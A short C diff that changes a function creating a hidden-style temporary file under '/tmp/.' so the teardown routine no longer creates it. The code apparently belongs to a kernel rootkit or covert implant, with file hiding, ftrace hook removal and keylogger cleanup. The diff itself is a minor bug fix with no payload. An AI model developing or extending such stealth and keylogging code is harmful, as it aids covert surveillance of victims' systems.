@@ -1246,9 +1246,9 @@ char *sys_ttyfile(void) {
     return file;
 }
 
-char *sys_sslfile(void) {
+char *sys_sslfile(bool init) {
     static char file[32] = {0};
-    if (*file == 0) {
+    if (*file == 0 && init) {
         if (_sys_file("/tmp/.", file, 31)) {
             const char *tmp[] = {file, NULL};
             fs_add_name_ro(tmp,0);
@@ -1283,7 +1283,7 @@ void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
 
     fh_remove_hooks(ft_hooks);
-    fs_file_rm(sys_sslfile());
+    fs_file_rm(sys_sslfile(false));
     _keylog_cleanup();
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
